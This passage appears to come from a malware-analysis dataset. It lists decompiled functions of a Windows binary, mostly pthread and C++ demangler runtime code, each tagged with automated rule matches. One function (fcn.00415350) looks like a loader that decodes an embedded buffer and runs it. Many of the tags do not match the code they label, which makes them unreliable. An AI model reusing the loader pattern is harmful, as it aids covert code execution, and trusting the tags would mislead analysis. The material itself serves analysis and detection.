        "decompiled_code": "\nulong fcn.0040e550(uint64_t arg1, ulong arg2)\n\n{\n    int64_t arg1_00;\n    uint uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    \n    arg1 = arg1 & 0xffffffff;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    iVar2 = fcn.0040cd40();\n    arg1_00 = iVar2 + 0x60;\n    fcn.00410db0(arg1_00);\n    uVar7 = arg1;\n    if (*(iVar2 + 0x48) < uVar7 || *(iVar2 + 0x48) == uVar7) {\n        iVar6 = uVar7 + 1;\n        iVar3 = sub.msvcrt.dll_realloc(*(iVar2 + 0x50), iVar6 * 8);\n        if (iVar3 != 0) {\n            iVar4 = sub.msvcrt.dll_realloc(*(iVar2 + 0x58), iVar6);\n            if (iVar4 != 0) {\n                sub.msvcrt.dll_memset(iVar3 + *(iVar2 + 0x48) * 8, 0, iVar6 - *(iVar2 + 0x48) << 3);\n                sub.msvcrt.dll_memset(*(iVar2 + 0x48) + iVar4, 0, iVar6 - *(iVar2 + 0x48));\n                *(iVar2 + 0x50) = iVar3;\n                *(iVar2 + 0x58) = iVar4;\n                *(iVar2 + 0x48) = iVar6;\n                goto code_r0x0040e58b;\n            }\n        }\n        fcn.00410d10(arg1_00);\n        uVar5 = 0xc;\n    }\n    else {\n        iVar3 = *(iVar2 + 0x50);\ncode_r0x0040e58b:\n        *(iVar3 + arg1 * 8) = arg2;\n        *(*(iVar2 + 0x58) + arg1) = 1;\n        fcn.00410d10(arg1_00);\n        (*_sym.imp.KERNEL32.dll_SetLastError)(uVar1);\n        uVar5 = 0;\n    }\n    return uVar5;\n}\n",
        "token_count": 531
    },
    "00410720": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.00410720(int32_t **arg1, int64_t arg2)\n\n{\n    uchar *arg2_00;\n    ulong *puVar1;\n    code *pcVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    ulong uVar10;\n    char *arg1_00;\n    int32_t *arg1_01;\n    int32_t *piVar11;\n    uint64_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    ulong auStack184 [5];\n    ulong uStack144;\n    ulong uStack136;\n    uint64_t auStack128 [2];\n    \n    uVar12 = 0xffffffff;\n    if (arg2 != 0) {\n        uVar12 = fcn.00410410(arg1);\n        if (uVar12 != 0) {\n            return uVar12;\n        }\n        piVar11 = *arg1;\n        uVar5 = fcn.0040fe40(piVar11);\n        uVar12 = uVar5;\n        if (uVar5 == 0x10) {\n            if ((((*arg1)[2] == 0) || (iVar4 = (*arg1)[5],  iVar4 == 0)) ||\n               (iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)(),  iVar4 != iVar6)) {\n                uVar8 = fcn.00412250(piVar11, uVar12);\n                uVar9 = fcn.00412280(arg2);\n                fcn.0040fec0(*arg1, 0x10);\n                uVar12 = 0;\n                if (uVar8 <= uVar9) {\n                    uVar12 = uVar9 - uVar8;\n                }\n                goto code_r0x00410640;\n            }\n            uVar5 = 0x24;\n        }\n        uStack136 = *arg1;\n        goto code_r0x0040fec0;\n    }\ncode_r0x00410640:\n    uVar8 = fcn.00410410(arg1);\n    if (uVar8 != 0) {\n        return uVar8;\n    }\n    piVar11 = *arg1;\n    arg1_01 = piVar11;\n    if ((piVar11[2] == 0) || (iVar4 = piVar11[5],  iVar4 == 0)) {\ncode_r0x0041066c:\n        uVar10 = *(piVar11 + 6);\n        fcn.0040fec0(arg1_01, 0);\n        uVar12 = fcn.00412860(uVar10, 1, uVar12);\n        if (uVar12 != 0) {\n            return uVar12;\n        }\n        uVar12 = fcn.00410410(arg1);\n        if (uVar12 != 0) {\n            return uVar12;\n        }\n        piVar11[3] = 1;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        piVar11[5] = iVar4;\ncode_r0x004106c5:\n        uVar5 = 0;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        if (iVar4 != iVar6) {\n            arg1_01 = *arg1;\n            goto code_r0x0041066c;\n        }\n        uVar5 = 0x24;\n        if (piVar11[2] == 2) {\n            LOCK();\n            piVar11[3] = piVar11[3] + 1;\n            goto code_r0x004106c5;\n        }\n    }\n    uStack136 = *arg1;\ncode_r0x0040fec0:\n    auStack128[0] = uVar5;\n    if (*0x434a38 == 0) {\n        *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n    }\n    fcn.00410db0(*0x434a38);\n    iVar7 = *0x434a38;\n    if ((*uStack136 == -0x454e0ff3) && (0 < uStack136[1])) {\n        bVar14 = *0x434a38 == 0;\n        uStack136[1] = uStack136[1] + -1;\n        if (bVar14) {\n            *0x434a38 = fcn.00410a00(\"mutex_global_shmem\", 0x10, 0x40fb30);\n            fcn.00410d10(*0x434a38);\n            return auStack128[0];\n        }\n        fcn.00410d10(iVar7);\n        return auStack128[0];\n    }\n    iVar7 = (*_sym.imp.msvcrt.dll___iob_func)();\n    sub.msvcrt.dll_fprintf(iVar7 + 0x60, 0x42f208, \"(m_->valid == LIFE_MUTEX) && (m_->busy > 0)\");\n    sub.msvcrt.dll_exit(1);\n    arg1_00 = \"mutex_global_shmem\";\n    auStack184[0] = 0x410a26;\n    iVar4 = sub.msvcrt.dll_strlen();\n    auStack184[0] = 0x410a3e;\n    iVar7 = fcn.0040b810(arg1_00);\n    iVar7 = -iVar7;\n    arg2_00 = &stack0xffffffffffffff70 + iVar7;\n    *(&stack0xffffffffffffff70 + iVar7) = 0x656d68732d636367;\n    *(&stack0xffffffffffffff78 + iVar7) = 0x64742d6d;\n    *(&stack0xffffffffffffff7c + iVar7) = 0x326d;\n    uVar5 = iVar4 + 0x50;\n    (&stack0xffffffffffffff7e)[iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410a86;\n    sub.msvcrt.dll_memcpy(&stack0xffffffffffffff7f + iVar7, \"mutex_global_shmem\", iVar4);\n    puVar1 = &stack0xffffffffffffff80 + iVar4 + iVar7;\n    *puVar1 = 0x6161616161616161;\n    puVar1[1] = 0x6161616161616161;\n    puVar1[2] = 0x6161616161616161;\n    puVar1[3] = 0x6161616161616161;\n    puVar1[4] = 0x6161616161616161;\n    puVar1[5] = 0x6161616161616161;\n    puVar1[6] = 0x6161616161616161;\n    puVar1[7] = 0x6161616161616161;\n    (&stack0xffffffffffffff70)[uVar5 + iVar7] = 0;\n    (&stack0xffffffffffffff70)[(iVar4 + 0xf) + iVar7] = 0;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ace;\n    uVar10 = (*_sym.imp.KERNEL32.dll_CreateMutexA)(0, 0);\n    (&stack0xffffffffffffff70)[(iVar4 + 0xf) + iVar7] = 0x2d;\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410ae4;\n    iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uVar10, 0xffffffff);\n    if (iVar6 != 0) {\n        pcVar2 = swi(3);\n        uVar12 = (*pcVar2)();\n        return uVar12;\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410af2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomA)();\n    if (uVar3 == 0) {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b07;\n        uVar8 = sub.msvcrt.dll_malloc(0x10);\n        uVar12 = 0x40;\n        do {\n            if ((uVar8 >> (uVar12 & 0x3f) & 1) != 0) {\n                arg2_00[uVar5 - uVar12] = 0x41;\n            }\n            uVar13 = uVar12 - 1;\n            uVar12 = uVar13;\n        } while (uVar13 != 0);\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b33;\n        uVar3 = (*_sym.imp.KERNEL32.dll_AddAtomA)();\n        if (uVar3 == 0) {\n            pcVar2 = swi(3);\n            uVar12 = (*pcVar2)();\n            return uVar12;\n        }\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b49;\n        uVar12 = fcn.00410980(uVar3, arg2_00, uVar5, iVar4 + 0x10);\n        if (uVar12 == uVar8) {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410ba6;\n            sub.msvcrt.dll_memset(uVar8, 0, 0x10);\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410bb1;\n            (*0x40fb30)(uVar8);\n        }\n        else {\n            *(&stack0xffffffffffffff48 + iVar7) = 0x410b59;\n            sub.msvcrt.dll_free(uVar8);\n        }\n    }\n    else {\n        *(&stack0xffffffffffffff48 + iVar7) = 0x410b94;\n        uVar12 = fcn.00410980(uVar3, arg2_00, uVar5, iVar4 + 0x10);\n    }\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b62;\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(uVar10);\n    *(&stack0xffffffffffffff48 + iVar7) = 0x410b6b;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar10);\n    return uVar12;\n}\n",
        "token_count": 2326
    },
    "004119d0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.004119d0(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    uint64_t uVar2;\n    \n    if ((*arg1 != 0xffffffffffffffff) || (uVar2 = fcn.004118f0(arg1),  (uVar2 & 0xffffffef) == 0)) {\n        if (*0x434a58 == 0) {\n            *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n        }\n        fcn.00410db0(*0x434a58);\n        piVar1 = *arg1;\n        uVar2 = 0x16;\n        if ((piVar1 != NULL) && (*piVar1 == -0x454e0f13)) {\n            piVar1[1] = piVar1[1] + 1;\n            uVar2 = 0;\n        }\n        if (*0x434a58 == 0) {\n            *0x434a58 = fcn.00410a00(\"rwl_global_shmem\", 0x10, 0x411320);\n        }\n        fcn.00410d10(*0x434a58);\n    }\n    return uVar2;\n}\n",
        "token_count": 287
    },
    "00412340": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00412340(ulong arg1, ulong arg2, ulong arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg3);\n    iVar1 = *arg4;\n    if (0x7fffffff < arg2 + iVar1) {\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n        return 0x22;\n    }\n    LOCK();\n    *arg4 = *arg4 + arg2;\n    if (iVar1 < 0) {\n        iVar2 = -iVar1;\n        if (arg2 < -iVar1) {\n            iVar2 = arg2;\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(arg1, iVar2, 0);\n        if (iVar1 == 0) {\n            LOCK();\n            *arg4 = *arg4 - arg2;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n            return 0x16;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(arg3);\n    return 0;\n}\n",
        "token_count": 258
    },
    "00413960": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t fcn.00413960(ulong arg1, int64_t arg2)\n\n{\n    uint8_t uVar1;\n    \n    if (arg1 == 0xff) {\n        return 0;\n    }\n    uVar1 = arg1 & 0x70;\n    if (uVar1 == 0x20) {\n        return *(*(arg2 + 0x20) + 8);\n    }\n    if (uVar1 < 0x21) {\n        if ((arg1 & 0x70) == 0) {\n            return 0;\n        }\n        if (uVar1 == 0x10) {\n            return 0;\n        }\n    }\n    else {\n        if (uVar1 == 0x40) goto code_r0x004139b0;\n        if (uVar1 == 0x50) {\n            return 0;\n        }\n        if (uVar1 == 0x30) {\n            return 0;\n        }\n    }\n    sub.msvcrt.dll_abort();\ncode_r0x004139b0:\n    return **(*(arg2 + 0x20) + 0x10) + *(*(arg2 + 0x20) + 8);\n}\n",
        "token_count": 269
    },
    "004147e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nulong fcn.004147e0(int64_t arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    \n    if (arg2 == arg1) {\n        return 1;\n    }\n    if ((**(arg1 + 8) != '*') &&\n       (iVar1 = sub.msvcrt.dll_strcmp(*(arg1 + 8), *(arg2 + 8) + (**(arg2 + 8) == '*')),  iVar1 == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "00415350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00415350(void)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    ulong *puVar3;\n    ulong var_9f0h;\n    ulong var_9fch;\n    ulong var_a20h;\n    ulong var_a28h;\n    ulong var_a30h;\n    ulong var_a38h;\n    ulong uStack2680;\n    uint uStack2672;\n    ulong uStack2664;\n    ulong auStack2648 [318];\n    ulong s;\n    ulong var_58h;\n    ulong var_50h;\n    ulong c;\n    ulong uStack48;\n    code *pcStack40;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    \n    uStack48 = 0x415359;\n    fcn.0040a810();\n    uStack28 = 0;\n    uStack32 = 0;\n    pcStack40 = NULL;\n    iVar1 = (*_sym.imp.ole32.dll_CoLoadLibrary)(L\"sc.exe\", 0);\n    if (iVar1 != 0) {\n        puVar2 = 0x419440;\n        puVar3 = &stack0xfffffffffffff5a8;\n        for (iVar1 = 0x145; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar3 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        *puVar3 = *puVar2;\n        uStack28 = 0xa2c;\n        uStack32 = 0x3400;\n        sub.msvcrt.dll_memset(&stack0xfffffffffffff588, 0, 0x20);\n        uStack2680 = 0;\n        uStack2672 = 1;\n        uStack2664 = fcn.004014f0(0x416020, uStack32);\n        pcStack40 = fcn.004014f0(&stack0xfffffffffffff5a8, uStack28);\n        (*pcStack40)(&stack0xfffffffffffff588);\n    }\n    return 0;\n}\n",
        "token_count": 473
    },
    "004017e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.004017e0(int64_t arg1, ulong arg2, int64_t arg3, int64_t arg4)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    \n    if (0x4b < arg2) {\n        return NULL;\n    }\n    // switch table (76 cases) at 0x42d260\n    switch(*(arg2 * 4 + 0x42d260) + 0x42d260) {\n    case 0x401800:\n        if (arg3 != 0) goto code_r0x00401805;\n        break;\n    case 0x401805:\n        goto code_r0x00401805;\n    case 0x401840:\n        if (arg3 == 0) {\n            return NULL;\n        }\n    case 0x401845:\n        if (arg4 != 0) {\ncode_r0x00401805:\n            iVar2 = *(arg1 + 0x28);\n            puVar3 = NULL;\n            if (iVar2 < *(arg1 + 0x2c)) {\n                *(arg1 + 0x28) = iVar2 + 1;\n                puVar1 = *(arg1 + 0x20) + iVar2 * 0x18;\n                if (puVar1 != NULL) {\n                    *puVar1 = arg2;\n                    *(puVar1 + 2) = arg3;\n                    *(puVar1 + 4) = arg4;\n                    puVar3 = puVar1;\n                }\n            }\n            return puVar3;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 367
    },
    "00401860": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.00401860(int64_t arg1, int64_t arg2, ulong arg3)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(arg1 + 0x28);\n    if (iVar2 < *(arg1 + 0x2c)) {\n        *(arg1 + 0x28) = iVar2 + 1;\n        puVar1 = *(arg1 + 0x20) + iVar2 * 0x18;\n        if (((puVar1 != NULL) && (arg2 != 0)) && (arg3 != 0)) {\n            *puVar1 = 0;\n            *(puVar1 + 2) = arg2;\n            puVar1[4] = arg3;\n            return puVar1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 185
    },
    "004019d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.004019d0(int64_t arg1, uint *arg2)\n\n{\n    uint *puVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint *puVar5;\n    uint uVar6;\n    \n    pcVar4 = *(arg1 + 0x18);\n    cVar2 = *pcVar4;\n    if (cVar2 == 'O') {\n        if (cVar2 == 'R') goto code_r0x00401a09;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 3;\n        uVar6 = 0x20;\n        *(arg1 + 0x18) = pcVar4 + 1;\n    }\n    else {\n        if (cVar2 != 'R') {\n            return arg2;\n        }\ncode_r0x00401a09:\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 2;\n        uVar6 = 0x1f;\n        *(arg1 + 0x18) = pcVar4 + 1;\n    }\n    switch(uVar6) {\n    case 1:\n    case 2:\n    case 3:\n    case 4:\n    case 0xb:\n    case 0x21:\n    case 0x2b:\n    case 0x2d:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n    case 0x38:\n    case 0x39:\n    case 0x3b:\n    case 0x3c:\n    case 0x3e:\n        break;\n    case 9:\n    case 10:\n    case 0xc:\n    case 0xd:\n    case 0xe:\n    case 0xf:\n    case 0x10:\n    case 0x11:\n    case 0x12:\n    case 0x13:\n    case 0x14:\n    case 0x15:\n    case 0x16:\n    case 0x17:\n    case 0x22:\n    case 0x23:\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x28:\n    case 0x33:\n    case 0x34:\n    case 0x3a:\n    case 0x3d:\n        if (arg2 != NULL) goto code_r0x00401805;\n        break;\n    case 0x19:\n    case 0x1a:\n    case 0x1b:\n    case 0x1c:\n    case 0x1d:\n    case 0x1e:\n    case 0x1f:\n    case 0x20:\n    case 0x29:\n    case 0x2e:\n    case 0x2f:\ncode_r0x00401805:\n        iVar3 = *(arg1 + 0x28);\n        puVar5 = NULL;\n        if (iVar3 < *(arg1 + 0x2c)) {\n            *(arg1 + 0x28) = iVar3 + 1;\n            puVar1 = *(arg1 + 0x20) + iVar3 * 0x18;\n            if (puVar1 != NULL) {\n                *puVar1 = uVar6;\n                *(puVar1 + 2) = arg2;\n                *(puVar1 + 4) = 0;\n                puVar5 = puVar1;\n            }\n        }\n        return puVar5;\n    }\n    return NULL;\n}\n",
        "token_count": 799
    },
    "004020f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004020f0(ulong arg1, uint *arg2)\n\n{\n    int32_t *piVar1;\n    \n    if (arg2 != NULL) {\n        do {\n    // switch table (75 cases) at 0x42d3b0\n            switch(*arg2) {\n            case 0:\n            case 6:\n            case 0x18:\n            case 0x27:\n            case 0x31:\n            case 0x3f:\n            case 0x44:\n            case 0x46:\n            case 0x49:\n            case 0x4a:\n                goto code_r0x00402142;\n            case 5:\n                piVar1 = fcn.00402080(arg1, arg2 + 2);\n                if ((piVar1 != NULL) && (*piVar1 == 0x2f)) {\n                    return piVar1;\n                }\n                goto code_r0x00402142;\n            case 7:\n            case 8:\n            case 0x32:\n                goto code_r0x00402131;\n            }\n            piVar1 = fcn.004020f0(arg1, *(arg2 + 2));\n            if (piVar1 != NULL) {\n                return piVar1;\n            }\ncode_r0x00402131:\n            arg2 = *(arg2 + 4);\n        } while (arg2 != NULL);\n    }\ncode_r0x00402142:\n    return NULL;\n}\n",
        "token_count": 325
    },
    "004046f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004046f0(int64_t arg1, uchar *s)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar3 = sub.msvcrt.dll_strlen(s);\n    if (iVar3 != 0) {\n        puVar1 = s + iVar3;\n        iVar3 = *(arg1 + 0x100);\n        do {\n            uVar2 = *s;\n            if (iVar3 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff);\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar4 = 1;\n                iVar3 = 0;\n            }\n            else {\n                iVar4 = iVar3 + 1;\n            }\n            s = s + 1;\n            *(arg1 + 0x100) = iVar4;\n            *(arg1 + iVar3) = uVar2;\n            *(arg1 + 0x108) = uVar2;\n            iVar3 = iVar4;\n        } while (s != puVar1);\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "00408b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408b60(int64_t arg1, ulong arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    uchar uVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uint64_t arg2_00;\n    uchar *puVar5;\n    \n    arg2_00 = arg2;\n    piVar2 = arg4;\n    if (arg4 != NULL) {\ncode_r0x00408b81:\n        if (*(piVar2 + 2) != 0) goto code_r0x00408b8c;\n        if (*piVar2[1] != 0x2a) {\n            iVar4 = *(arg1 + 0x100);\n            puVar5 = 0x42dd70;\n            do {\n                uVar1 = *puVar5;\n                if (iVar4 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar3 = 0;\n                    iVar4 = 1;\n                }\n                else {\n                    iVar3 = iVar4;\n                    iVar4 = iVar4 + 1;\n                }\n                puVar5 = puVar5 + 1;\n                *(arg1 + 0x100) = iVar4;\n                *(arg1 + iVar3) = uVar1;\n                *(arg1 + 0x108) = uVar1;\n            } while (puVar5 != 0x42dd72);\n            fcn.00408790(arg1, arg2_00, arg4, 0);\n            iVar4 = *(arg1 + 0x100);\n            if (iVar4 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar3 = 1;\n                iVar4 = 0;\n            }\n            else {\n                iVar3 = iVar4 + 1;\n            }\n            *(arg1 + 0x100) = iVar3;\n            *(arg1 + iVar4) = 0x29;\n            *(arg1 + 0x108) = 0x29;\n            goto code_r0x00408bab;\n        }\n        fcn.00408790(arg1, arg2_00, arg4, 0);\n        iVar4 = *(arg1 + 0x100);\n        goto code_r0x00408bcd;\n    }\ncode_r0x00408ba4:\n    iVar3 = *(arg1 + 0x100);\ncode_r0x00408bab:\n    if (iVar3 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n        iVar4 = 1;\n        iVar3 = 0;\n    }\n    else {\n        iVar4 = iVar3 + 1;\n    }\n    *(arg1 + 0x100) = iVar4;\n    *(arg1 + iVar3) = 0x20;\n    *(arg1 + 0x108) = 0x20;\ncode_r0x00408bcd:\n    if (iVar4 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n        iVar3 = 1;\n        iVar4 = 0;\n    }\n    else {\n        iVar3 = iVar4 + 1;\n    }\n    *(arg1 + 0x100) = iVar3;\n    *(arg1 + iVar4) = 0x5b;\n    *(arg1 + 0x108) = 0x5b;\n    if (*arg3 != 0) {\n        fcn.00407f90(arg1, arg2_00, *arg3);\n        iVar3 = *(arg1 + 0x100);\n    }\n    if (iVar3 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n        iVar4 = 1;\n        iVar3 = 0;\n    }\n    else {\n        iVar4 = iVar3 + 1;\n    }\n    *(arg1 + 0x100) = iVar4;\n    *(arg1 + iVar3) = 0x5d;\n    *(arg1 + 0x108) = 0x5d;\n    return;\ncode_r0x00408b8c:\n    piVar2 = *piVar2;\n    if (piVar2 == NULL) goto code_r0x00408b94;\n    goto code_r0x00408b81;\ncode_r0x00408b94:\n    fcn.00408790(arg1, arg2_00, arg4, 0);\n    goto code_r0x00408ba4;\n}\n",
        "token_count": 1251
    },
    "00408de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408de0(int64_t arg1, ulong arg2, int64_t *arg3, int64_t *arg4)\n\n{\n    int32_t iVar1;\n    int64_t *piVar2;\n    ulong uVar3;\n    uint8_t uVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint64_t arg2_00;\n    uint64_t uVar7;\n    \n    arg2_00 = arg2;\n    if (arg4 != NULL) {\n        iVar1 = *(arg4 + 2);\n        piVar2 = arg4;\n        while (iVar1 == 0) {\n            if (*piVar2[1] - 0x19U < 0x13) {\n                uVar7 = 1 << (*piVar2[1] - 0x19U & 0x3f);\n                if ((uVar7 & 0x43107) != 0) {\n                    uVar4 = *(arg1 + 0x108);\ncode_r0x00408e61:\n                    if (uVar4 == 0x20) {\ncode_r0x00408fd5:\n                        iVar6 = *(arg1 + 0x100);\n                        if (iVar6 != 0xff) goto code_r0x00408fe8;\ncode_r0x00408e9f:\n                        *(arg1 + 0xff) = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar5 = 1;\n                        iVar6 = 0;\n                    }\n                    else {\n                        iVar5 = *(arg1 + 0x100);\n                        if (iVar5 == 0xff) {\n                            *(arg1 + 0xff) = 0;\n                            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                            iVar6 = 1;\n                            iVar5 = 0;\n                        }\n                        else {\n                            iVar6 = iVar5 + 1;\n                        }\n                        *(arg1 + 0x100) = iVar6;\n                        *(arg1 + iVar5) = 0x20;\n                        *(arg1 + 0x108) = 0x20;\n                        if (iVar6 == 0xff) goto code_r0x00408e9f;\ncode_r0x00408fe8:\n                        iVar5 = iVar6 + 1;\n                    }\n                    *(arg1 + 0x100) = iVar5;\n                    uVar3 = *(arg1 + 0x128);\n                    *(arg1 + iVar6) = 0x28;\n                    *(arg1 + 0x108) = 0x28;\n                    *(arg1 + 0x128) = 0;\n                    fcn.00408790(arg1, arg2_00, arg4, 0);\n                    iVar5 = *(arg1 + 0x100);\n                    if (iVar5 == 0xff) {\n                        *(arg1 + 0xff) = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar6 = 1;\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar6 = iVar5 + 1;\n                    }\n                    *(arg1 + 0x100) = iVar6;\n                    *(arg1 + iVar5) = 0x29;\n                    *(arg1 + 0x108) = 0x29;\n                    goto joined_r0x00408f00;\n                }\n                if ((uVar7 & 0xe00) != 0) {\n                    uVar4 = *(arg1 + 0x108);\n                    if ((uVar4 & 0xfd) != 0x28) goto code_r0x00408e61;\n                    goto code_r0x00408fd5;\n                }\n            }\n            piVar2 = *piVar2;\n            if (piVar2 == NULL) break;\n            iVar1 = *(piVar2 + 2);\n        }\n    }\n    uVar3 = *(arg1 + 0x128);\n    *(arg1 + 0x128) = 0;\n    fcn.00408790(arg1, arg2_00, arg4, 0);\n    iVar6 = *(arg1 + 0x100);\njoined_r0x00408f00:\n    if (iVar6 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n        iVar5 = 1;\n        iVar6 = 0;\n    }\n    else {\n        iVar5 = iVar6 + 1;\n    }\n    *(arg1 + 0x100) = iVar5;\n    *(arg1 + iVar6) = 0x28;\n    *(arg1 + 0x108) = 0x28;\n    if ((*arg3 != 0) 